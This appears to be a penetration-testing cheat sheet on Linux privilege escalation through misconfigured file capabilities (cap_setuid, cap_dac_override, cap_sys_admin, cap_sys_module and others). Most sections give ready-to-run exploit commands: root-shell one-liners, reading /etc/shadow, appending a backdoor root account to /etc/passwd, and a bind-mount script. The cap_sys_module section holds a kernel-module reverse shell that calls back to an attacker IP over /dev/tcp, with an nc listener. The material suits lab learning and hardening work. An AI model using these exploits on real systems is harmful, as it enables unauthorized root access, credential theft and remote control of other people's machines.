
In This  we are having only capabilities by which, we can `escalate` more or less, directly or indirectly.
## Table of Contents

- [What are the Linux capabilities ?](#What%20are%20the%20Linux%20capabilities%20?)
- [Type of Capabilities Sets](#Type%20of%20Capabilities%20Sets)
- [Finding, Confirming and Removing Capabilities](#Finding,%20Confirming%20and%20Removing%20Capabilities)
	- [Finding All Binaries with Capabilities](#**Finding%20All%20Binaries%20with%20Capabilities**)
	- [Confirming the Capability](#**Confirming%20the%20Capability**)
	- [Removing the Capability](#**Removing%20the%20Capability**)
- [Common Capabilities That Can Lead to Privilege Escalation](#**Common%20Capabilities%20That%20Can%20Lead%20to%20Privilege%20Escalation**) 
	- [cap_setuid](#cap_setuid)
	- [cap_setgid](#cap_setgid)
	- [cap_dac_read_search](#cap_dac_read_search)
	- [cap_dac_override](#cap_dac_override)
	- [cap_sys_admin](#cap_sys_admin)
	- [cap_chown](#cap_chown)
	- [cap_fowner](#cap_fowner)
	- [cap_setfcap](#cap_setfcap)
	- [cap_sys_module](#cap_sys_module)
	- [cap_net_raw](#cap_net_raw)
- [Reference](#Reference)

## What are the Linux capabilities ?

 A granular set of permissions assigned to a running program or thread or even a program file by root user to allow process use privileged (system-level tasks) like killing process owned by different users from a shell of a low privileged user.

In a Nutshell, Capibilities define access control over process.

## Type of Capabilities Sets

- **Effective**: Capabilities actively used by the kernel to check permissions for privileged tasks.
- **Permitted**: The set of capabilities a process can move into its effective set.
- **Inheritable**: Capabilities that can be inherited by child processes when using execve().
- **Bounding**: Limits all the capabilities a process can have, acting as an upper boundary.
- **Ambient**: Non-privileged capabilities set during execve() and controlled via prctl().
## **Common Capabilities That Can Lead to Privilege Escalation**
| Capability               | Description                    | Potential Exploit                                         |
| ------------------------ | ------------------------------ | --------------------------------------------------------- |
| `cap_setuid+ep`          | Change UID/GID                 | Allows privilege escalation by switching to root          |
| `cap_setgid+ep`          | Change group ID                | Can escalate privileges by switching to privileged groups |
| `cap_dac_read_search+ep` | Bypass read/search permissions | Allows reading directories and files without permission   |
| `cap_dac_override+ep`    | Bypass file permissions        | Can read/write protected files                            |
| `cap_sys_admin+ep`       | Full system control            | Essentially root access                                   |
| `cap_chown+ep`           | Change file ownership          | Can take control of sensitive files                       |
| `cap_fowner+ep`          | Bypass file ownership checks   | Allows modifying files owned by other users               |
| `cap_setfcap+ep`         | Set file capabilities          | Can grant additional capabilities to executables          |
| `cap_sys_module+ep`      | Load/unload kernel modules     | Can introduce malicious kernel modules                    |
| `cap_net_raw+ep`         | Use raw sockets                | Can sniff network traffic or launch network attacks       |
## Finding, Confirming and Removing Capabilities

### **Finding All Binaries with Capabilities**

To list all binaries that have special capabilities, use:

```bash
getcap -r / 2> /dev/null
```

### **Confirming the Capability**

To verify that Python 3.9 has the `cap_dac_override` capability, execute:

```bash
getcap /usr/bin/python3.9
```


### **Removing the Capability**

To remove the `cap_dac_override` capability from Python 3.9, use:

```bash
setcap -r /usr/bin/python3.9
```


# **Capabilities for Privilege Escalation**

In the following, We have only showed Misconfiguration and Exploitation for finding, checking, description you can refer to [Finding, Confirming and Removing Capabilities ](#Finding,%20Confirming%20and%20Removing%20Capabilities) and for [Reference](#Reference)

## cap_setuid

#### Misconfiguring

```bash
setcap cap_setuid+ep /usr/bin/python3.9
```

#### Exploiting

By leveraging the `cap_setuid` capability, an attacker can escalate privileges with the following command:

```bash
/usr/bin/python3.9 -c 'import os; os.setuid(0); os.system("/bin/bash")'
```

This executes a Python command that changes the user ID to `0` (root) and spawns a root shell.

## cap_setgid

#### Misconfiguring

```bash
setcap cap_setgid+ep /usr/bin/python3.9
```

#### Exploiting

```bash
cat /etc/group
```

```bash
wheel:x:10:
```

```bash
python -c 'import os; os.setgid(10); os.system("/bin/bash")'
```

```bash
sudo su
```


>Also can read /etc/shadow file just change the group to shadow instead of wheel
___

## cap_dac_read_search

#### Misconfiguring

**tar**

```bash
setcap cap_dac_read_search+ep /usr/bin/tar
```

**python**

```
setcap cap_dac_read_search+ep /usr/bin/python3.9
```


#### Exploiting

**tar**

```bash
tar -cvf shadow.tar /etc/shadow
```

```bash
tar -xvf shadow.tar
```

```bash
chmod 644 etc/shadow
```

```bash
head -1 etc/shadow
```

**python**

```bash
python -c "print(next(open('/etc/shadow')))"
```

```bash
python3 -c 'print(open("/etc/shadow").read())'
```

## cap_dac_override

#### Misconfiguring

```bash
setcap cap_dac_override+ep /usr/bin/python3.9
```

#### Exploiting


**Reading the `/etc/shadow` File**

```bash
/usr/bin/python3.9 -c 'print(open("/etc/shadow").read())'
python3 -c 'print(open("/etc/shadow").read())'
```

**Modifying `/etc/passwd` to Escalate Privileges**

Appending a new root user entry to `/etc/passwd`:

```bash
/usr/bin/python3.9 -c 'open("/etc/passwd", "a").write("root2:$1$RBQLuaaV$4Dqrii/GXbnYm5TGVw96y.:0:0:root:/root:/bin/bash\n")'
```

This effectively adds a new root user (`root2`) with a known password hash.




## cap_sys_admin

#### Misconfiguring

```bash
setcap cap_sys_admin+ep /usr/bin/python3.9
```


#### Exploiting

we can't directly update the password in the **/etc/passwd** file, but I can perform a bind mount. Copy the /etc/passwd file to the current working directory (/home/armour) and make the changes in the root user password.

```bash
cd /home/armour
```

```bash
cp /etc/passwd .
```

```bash
vim passwd
```

```bash
root8:$1$RBQLuaaV$4Dqrii/GXbnYm5TGVw96y.:0:0:root:/root:/bin/bash
```


```bash
vim exploit.py
```




- exploit.py
	- according to normal user
```python title:exploit.py
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/home/armour/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```

```bash
chmod +x exploit.py
```

```bash
./exploit.py
```

or

```bash
python3 exploit.py
```

```bash
grep root8 /etc/passwd
```

___

## cap_chown

#### Misconfiguring

**python**

```bash
setcap cap_chown+ep /usr/bin/python3.9
```

**ruby**

```bash
setcap cap_chown+ep /usr/bin/ruby
```

#### Exploiting

**python**
- give `[ug]id` : armour
```bash
python -c 'import os;os.chown("/etc/shadow",1001,1001)'
```

```bash
python -c 'import os;os.chown("/etc/passwd",1001,1001)'
```

**ruby**

```bash
ruby -e 'require "fileutils"; FileUtils.chown(1000, 1000, "/etc/shadow")'
```

## cap_fowner

#### Misconfiguring

```bash
setcap cap_fowner+ep /usr/bin/python3.9
```

#### Exploiting

```bash
python -c 'import os;os.chmod("/etc/shadow",0o666)'
```


## cap_setfcap

#### Misconfiguring

```bash
setcap cap_setfcap+ep /usr/bin/python3.9
```

#### Exploiting

- set the library to load for setcap
```python title:setcapability.py
import ctypes
import sys

# Load the needed library (libcap.so.2)
libcap = ctypes.cdll.LoadLibrary("libcap.so.2")

# Define argument and return types for the functions we are going to use
libcap.cap_from_text.argtypes = [ctypes.c_char_p]
libcap.cap_from_text.restype = ctypes.c_void_p
libcap.cap_set_file.argtypes = [ctypes.c_char_p, ctypes.c_void_p]

# Check if path is passed as an argument
if len(sys.argv) < 2:
    print("Usage: python script.py <path_to_binary>")
    sys.exit(1)

# Get the binary path from arguments
path = sys.argv[1]
print(f"Setting capabilities for binary: {path}")

# The capability you want to add (in this case, cap_setuid)
cap = 'cap_setuid+ep'

# Convert the capability text to internal format (encode as byte string)
cap_t = libcap.cap_from_text(cap.encode('utf-8'))

# Set the capability for the specified binary
status = libcap.cap_set_file(path.encode('utf-8'), cap_t)

# Check if the operation was successful
if status == 0:
    print(f"Successfully added {cap} to {path}")
else:
    print(f"Failed to add {cap} to {path}")

```

```bash
/usr/bin/python3.9 setcapability.py /usr/bin/python3.9
```

```bash
[armour@localhost ~] getcap -r / 2> /dev/null
/usr/bin/python3.9 cap_setuid=ep
```




## cap_sys_module

#### Misconfiguring

```bash
setcap cap_sys_module+ep /usr/bin/kmod
```

#### Exploiting

- Change the IP address of the C code to the IP of your attacker machine.

```bash
cd
```

```bash
vim reverse-shell.c
```

```c title:reverse-shell.c
#include <linux/kmod.h>
#include <linux/module.h>
MODULE_LICENSE("GPL");
MODULE_AUTHOR("AttackDefense");
MODULE_DESCRIPTION("LKM reverse shell module");
MODULE_VERSION("1.0");

char* argv[] = {"/bin/bash","-c","bash -i >& /dev/tcp/192.168.1.150/443 0>&1", NULL};
static char* envp[] = {"PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin", NULL };

// call_usermodehelper function is used to create user mode processes from kernel space
static int __init reverse_shell_init(void) {
    return call_usermodehelper(argv[0], argv, envp, UMH_WAIT_EXEC);
}

static void __exit reverse_shell_exit(void) {
    printk(KERN_INFO "Exiting\n");
}

module_init(reverse_shell_init);
module_exit(reverse_shell_exit);
```

```bash
mkdir lib/modules -p
```

```bash
cp -a /lib/modules/$(uname -r)/ lib/modules/$(uname -r)
```

```bash
vim Makefile
```

- make sure you are using tab functionality instead of spaces after all and clean to avoid running into issues
```Makefile title:Makefile
obj-m +=reverse-shell.o

all:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) modules

clean:
    make -C /lib/modules/$(shell uname -r)/build M=$(PWD) clean
```

```bash
make
```

- In your Attacker Machine
```bash
nc -nlvp 443
```

```bash
insmod reverse-shell.ko #Launch the reverse shell
```

## cap_net_raw

#### Miscofiguring

```bash
setcap cap_net_raw+ep /usr/sbin/tcpdump
```

#### Exploiting

- Maybe you can sniff the password
```bash
tcpdump -n tcp
```

## Reference


https://www.hackingarticles.in/linux-privilege-escalation-using-capabilities/

https://tbhaxor.com/series/

https://www.armourinfosec.com/

https://chatgpt.com/

https://redfoxsec.com/blog/exploiting-linux-capabilities-capsysmodule-exploits/
